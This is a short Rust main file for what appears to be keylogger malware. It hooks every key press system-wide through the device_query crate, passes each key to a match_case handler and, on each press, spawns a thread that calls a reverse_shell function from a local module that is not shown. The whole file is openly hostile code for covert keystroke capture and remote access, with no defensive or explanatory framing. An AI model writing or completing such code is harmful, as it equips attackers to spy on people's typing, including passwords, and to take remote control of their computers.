extern crate dotenv;

mod lib;

use std::{ thread };

use device_query::{ DeviceState, DeviceEvents };
use lib::{ match_case, reverse_shell };


fn main() {

    // create a device state
    let device_state = DeviceState::new();

    // Every time a key is pressed, the reverse_shell function is called
    // reverse_shell() is called in a new thread so that the main thread can continue
    let _guard = device_state.on_key_down( move|key| {
    
        thread::spawn( move|| {
           reverse_shell();
        });

        // spawn a theard to handle the key press
        match_case(key);    
    
    });
        
    loop {}
}